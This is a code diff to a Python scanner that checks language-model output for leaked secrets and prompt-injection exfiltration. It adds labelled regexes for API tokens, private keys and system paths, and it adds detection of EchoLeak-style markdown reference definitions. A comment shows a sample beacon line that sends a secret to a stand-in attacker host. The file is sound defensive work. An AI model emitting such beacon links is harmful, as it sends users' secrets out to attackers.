@@ -95,39 +95,65 @@ class OutputScanResult:
 # Detection patterns
 # ---------------------------------------------------------------------------
 
-# API key / secret prefixes and patterns
-_SECRET_PATTERNS: List[re.Pattern] = [
-    # AWS access keys
-    re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
-    # OpenAI / Anthropic / Stripe style keys
-    re.compile(r"\b(sk-[a-zA-Z0-9]{20,})\b"),
-    # GitHub personal access tokens
-    re.compile(r"\b(ghp_[a-zA-Z0-9]{36,})\b"),
+# API key / secret prefixes and patterns.  Each entry is a (human-readable
+# label, compiled pattern) pair: the label is surfaced in the flag instead of
+# the raw regex source (which leaked the detection rule to any output
+# consumer).  Fixed-width token patterns use ``{N,}`` rather than a trailing
+# ``\b`` so a padded variant (e.g. AKIA…EXAMPLE0) cannot evade by appending an
+# extra alphanumeric that suppresses the word boundary.
+_SECRET_PATTERNS: List[tuple] = [
+    # AWS access keys (20-char AKIA prefix; {16,} catches padded evasions)
+    ("aws_access_key", re.compile(r"\bAKIA[0-9A-Z]{16,}\b")),
+    # OpenAI / Anthropic / Stripe (sk-) style keys
+    ("openai_anthropic_key", re.compile(r"\b(sk-[a-zA-Z0-9]{20,})\b")),
+    # Stripe live secret / restricted keys
+    ("stripe_live_key", re.compile(r"\b((?:sk|rk)_live_[0-9a-zA-Z]{16,})\b")),
+    # GitHub tokens: classic PAT, OAuth, server, refresh, user-to-server
+    ("github_token", re.compile(r"\b((?:ghp|gho|ghs|ghr|ghu)_[a-zA-Z0-9]{36,})\b")),
+    # GitHub fine-grained PAT
+    ("github_fine_grained_pat", re.compile(r"\b(github_pat_[0-9a-zA-Z_]{22,})\b")),
+    # GitLab personal access token
+    ("gitlab_pat", re.compile(r"\b(glpat-[0-9A-Za-z_\-]{20,})\b")),
+    # Google API key (AIza + 35 chars)
+    ("google_api_key", re.compile(r"\b(AIza[0-9A-Za-z_\-]{35})\b")),
+    # Google OAuth access token
+    ("google_oauth_token", re.compile(r"\b(ya29\.[0-9A-Za-z_\-]{20,})\b")),
+    # npm access token
+    ("npm_token", re.compile(r"\b(npm_[0-9A-Za-z]{36})\b")),
+    # PyPI upload token
+    ("pypi_token", re.compile(r"\b(pypi-[A-Za-z0-9_\-]{20,})\b")),
+    # SendGrid API key
+    ("sendgrid_key", re.compile(r"\b(SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43})\b")),
     # Slack tokens
-    re.compile(r"\b(xoxb-[a-zA-Z0-9\-]+)\b"),
-    re.compile(r"\b(xoxp-[a-zA-Z0-9\-]+)\b"),
+    ("slack_token", re.compile(r"\b(xox[bp]-[a-zA-Z0-9\-]+)\b")),
+    # Slack incoming-webhook URL (carries the secret token in the path)
+    ("slack_webhook", re.compile(r"https://hooks\.slack\.com/services/[A-Za-z0-9/]+")),
+    # AWS secret access key -- ONLY with the literal key name (a bare 40-char
+    # base64 blob is far too FP-prone to flag on its own)
+    ("aws_secret_access_key",
+     re.compile(r"(?i)aws_secret_access_key\s*[:=]\s*[A-Za-z0-9/+]{40}")),
     # Generic password / secret in output
-    re.compile(r"(?i)\bpassword\s*[:=]\s*\S+"),
-    re.compile(r"(?i)\bpasswd\s*[:=]\s*\S+"),
-    re.compile(r"(?i)\bsecret\s*[:=]\s*\S+"),
-    re.compile(r"(?i)\bapi[_\-]?key\s*[:=]\s*\S+"),
+    ("password_assignment", re.compile(r"(?i)\bpassword\s*[:=]\s*\S+")),
+    ("passwd_assignment", re.compile(r"(?i)\bpasswd\s*[:=]\s*\S+")),
+    ("secret_assignment", re.compile(r"(?i)\bsecret\s*[:=]\s*\S+")),
+    ("api_key_assignment", re.compile(r"(?i)\bapi[_\-]?key\s*[:=]\s*\S+")),
     # Bearer tokens
-    re.compile(r"(?i)\bbearer\s+[a-zA-Z0-9\-_.~+/]+=*\b"),
+    ("bearer_token", re.compile(r"(?i)\bbearer\s+[a-zA-Z0-9\-_.~+/]+=*\b")),
     # JWT pattern  (header.payload.signature)
-    re.compile(
-        r"\beyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\b"
-    ),
+    ("jwt",
+     re.compile(r"\beyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\b")),
     # Internal paths
-    re.compile(r"/etc/passwd"),
-    re.compile(r"C:\\\\?Windows\\\\?System32", re.IGNORECASE),
-    # BUG-L9-5: Database connection strings
-    re.compile(r"(?i)\b(?:postgres(?:ql)?|mysql|mongodb|mongodb\+srv)://[^\s\"']+"),
-    # BUG-L9-5: RSA / PEM private keys
-    re.compile(r"-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----"),
-    # BUG-L9-5: SSH private keys (OpenSSH format)
-    re.compile(r"-----BEGIN\s+OPENSSH\s+PRIVATE\s+KEY-----"),
-    # BUG-L9-5: x509 certificates
-    re.compile(r"-----BEGIN\s+CERTIFICATE-----"),
+    ("etc_passwd", re.compile(r"/etc/passwd")),
+    ("windows_system32", re.compile(r"C:\\\\?Windows\\\\?System32", re.IGNORECASE)),
+    # Database connection strings
+    ("db_connection_string",
+     re.compile(r"(?i)\b(?:postgres(?:ql)?|mysql|mongodb|mongodb\+srv)://[^\s\"']+")),
+    # RSA / PEM private keys
+    ("pem_private_key", re.compile(r"-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----")),
+    # SSH private keys (OpenSSH format)
+    ("openssh_private_key", re.compile(r"-----BEGIN\s+OPENSSH\s+PRIVATE\s+KEY-----")),
+    # x509 certificates
+    ("x509_certificate", re.compile(r"-----BEGIN\s+CERTIFICATE-----")),
 ]
 
 # Phrases that suggest the LLM broke character / accepted injection
@@ -206,6 +232,23 @@ _EXFIL_QUERY_PARAMS = re.compile(
     r"auth|q|prompt|content)=",
     re.IGNORECASE,
 )
+
+# STRICT exfil query params -- the unambiguous data-stealing names only.
+# Used for reference-style link definitions where the ambiguous params
+# (q / prompt / content) appear in countless benign URLs (search links,
+# doc anchors), so flagging them there would be FP-unsafe.
+_STRICT_EXFIL_QUERY_PARAMS = re.compile(
+    r"[?&](?:data|token|key|secret|password|passwd|ssn|cc|cookie|session|auth)=",
+    re.IGNORECASE,
+)
+
+# Reference-style markdown link/image DEFINITION:  "[id]: url".  EchoLeak-style
+# exfil hides the beacon in a separate definition --
+#   ![logo][1]
+#   [1]: https://attacker/?data=SECRET
+# -- so the inline _MARKDOWN_IMAGE rule (which only matches ![alt](url)) misses
+# it.  Captures the definition URL so the beacon shape can be checked.
+_MARKDOWN_REF_DEFINITION = re.compile(r"^[ \t]*\[[^\]]+\]:[ \t]*(\S+)", re.MULTILINE)
 
 # Markdown image:  ![alt](url)  -- captures the URL for host-allowlisting
 _MARKDOWN_IMAGE = re.compile(r"!\[[^\]]*\]\((https?://[^)]+)\)")
@@ -397,12 +440,27 @@ class OutputScanner:
         system_prompt: Optional[str] = None,
     ) -> OutputScanResult:
         """Scan LLM output and return an ``OutputScanResult``."""
-        if not output_text or not output_text.strip():
+        # Defensive coercion: an upstream caller may hand us non-str output
+        # (bytes from a streaming decoder, a dict/model object).  Coerce
+        # rather than raise -- an uncaught TypeError here propagates to the
+        # cascade's scan_output wrapper, which fails OPEN (treats the output
+        # as safe).  That is precisely the wrong default for a security
+        # scanner, so we normalise to text and scan it instead.
+        if output_text is None:
+            return OutputScanResult(
+                is_suspicious=False, risk_score=0.0, flags=[], redacted_text=""
+            )
+        if not isinstance(output_text, str):
+            if isinstance(output_text, (bytes, bytearray)):
+                output_text = output_text.decode("utf-8", "replace")
+            else:
+                output_text = str(output_text)
+        if not output_text.strip():
             return OutputScanResult(
                 is_suspicious=False,
                 risk_score=0.0,
                 flags=[],
-                redacted_text=output_text or "",
+                redacted_text=output_text,
             )
 
         flags: List[str] = []
@@ -526,7 +584,10 @@ class OutputScanner:
         PII patterns are used.
         """
         if patterns is None:
-            patterns = list(_SECRET_PATTERNS) + list(_PII_PATTERNS.values())
+            patterns = (
+                [pat for _label, pat in _SECRET_PATTERNS]
+                + list(_PII_PATTERNS.values())
+            )
         result = text
         for pat in patterns:
             result = pat.sub("[REDACTED]", result)
@@ -551,7 +612,7 @@ class OutputScanner:
         spans: List[tuple] = []
 
         # Secrets
-        for pat in _SECRET_PATTERNS:
+        for _label, pat in _SECRET_PATTERNS:
             spans.extend(m.span() for m in pat.finditer(text))
 
         # PII (medium / high sensitivity only)
@@ -572,6 +633,11 @@ class OutputScanner:
         # javascript: href/src + hidden AI-directed HTML comments
         spans.extend(m.span() for m in _JAVASCRIPT_HREF.finditer(text))
         spans.extend(m.span() for m in _HIDDEN_AI_COMMENT.finditer(text))
+
+        # Reference-style definition beacon URLs (EchoLeak out-of-line exfil)
+        for ref in _MARKDOWN_REF_DEFINITION.finditer(text):
+            if self._is_exfil_reference(ref.group(1).strip("<>")):
+                spans.append(ref.span(1))
 
         # Exfiltration + egress URLs
         for pat in _EXFILTRATION_URL_PATTERNS:
@@ -820,11 +886,13 @@ class OutputScanner:
         score = 0.0
         redacted = text
 
-        for pat in _SECRET_PATTERNS:
-            matches = pat.findall(text)
-            if matches:
-                sample = matches[0] if isinstance(matches[0], str) else matches[0]
-                label = pat.pattern[:40]
+        for label, pat in _SECRET_PATTERNS:
+            m = pat.search(text)
+            if m:
+                # group(0) is the full match regardless of capture groups
+                # (findall returned the capture group, or a tuple when a
+                # pattern had several -- an unreliable sample source).
+                sample = m.group(0)
                 flags.append(f"Secret pattern detected ({label}): {sample[:20]}...")
                 score = max(score, 0.6)
                 redacted = pat.sub("[REDACTED]", redacted)
@@ -951,7 +1019,41 @@ class OutputScanner:
             redactions.append(m.group())
             technique_ids.append(_O2_TECHNIQUE_MAP["markdown"])
 
+        # Reference-style link/image definitions whose URL is a beacon
+        # (EchoLeak-style out-of-line exfil).  Gated on the STRICT exfil shape
+        # so benign reference links stay clean.
+        for ref in _MARKDOWN_REF_DEFINITION.finditer(text):
+            url = ref.group(1).strip("<>")
+            if self._is_exfil_reference(url):
+                flags.append(f"Markdown/HTML injection: '{url[:50]}'")
+                score = max(score, 0.5)
+                redactions.append(url)
+                technique_ids.append(_O2_TECHNIQUE_MAP["markdown"])
+
         return (score, flags, redactions, technique_ids)
+
+    @staticmethod
+    def _is_exfil_reference(url: str) -> bool:
+        """Return True if a reference-definition URL has an exfil shape.
+
+        Mirrors :meth:`_is_image_beacon` but uses the STRICT exfil-param set
+        (no ambiguous q/prompt/content) because reference definitions are
+        frequently ordinary links.  A ``data:`` URI or a strict exfil query on
+        a non-trusted host is a beacon; everything else stays clean.
+        """
+        u = url.lower()
+        if u.startswith("data:"):
+            return True
+        if not u.startswith(("http://", "https://")):
+            return False
+        try:
+            host = (urllib.parse.urlparse(url).hostname or "").lower()
+        except ValueError:
+            return False
+        for trusted in _TRUSTED_IMAGE_HOSTS:
+            if host == trusted or host.endswith("." + trusted):
+                return False
+        return bool(_STRICT_EXFIL_QUERY_PARAMS.search(url))
 
     @staticmethod
     def _is_image_beacon(url: str) -> bool:
